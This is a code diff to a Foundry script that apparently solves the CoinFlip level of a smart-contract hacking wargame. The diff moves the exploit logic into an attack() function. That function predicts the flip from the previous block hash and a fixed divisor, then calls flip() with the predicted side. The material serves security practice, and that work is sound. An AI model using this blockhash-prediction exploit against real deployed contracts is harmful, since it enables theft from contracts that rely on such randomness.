@@ -7,6 +7,8 @@ import {Script, console} from "forge-std/Script.sol";
 
 contract CoinFlipSolution is Script {
     CoinFlip public coinFlipLevel;
+    uint256 constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     function run() external {
         address publicKey = vm.envAddress("PUBLIC_KEY");
@@ -17,7 +19,7 @@ contract CoinFlipSolution is Script {
         coinFlipLevel = CoinFlip(instanceAddress);
 
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        new Attacker(coinFlipLevel);
+        coinFlipLevel.flip(attack());
         console.log("Consecutive Wins: %s", coinFlipLevel.consecutiveWins());
 
         vm.stopBroadcast();
@@ -28,16 +30,10 @@ contract CoinFlipSolution is Script {
         );
         console.log("Challenge Completed: %s", isValidated);
     }
-}
 
-contract Attacker {
-    uint256 constant FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
-    constructor(CoinFlip _level) {
+    function attack() public view returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1 ? true : false;
-        _level.flip(side);
+        return coinFlip == 1 ? true : false;
     }
 }
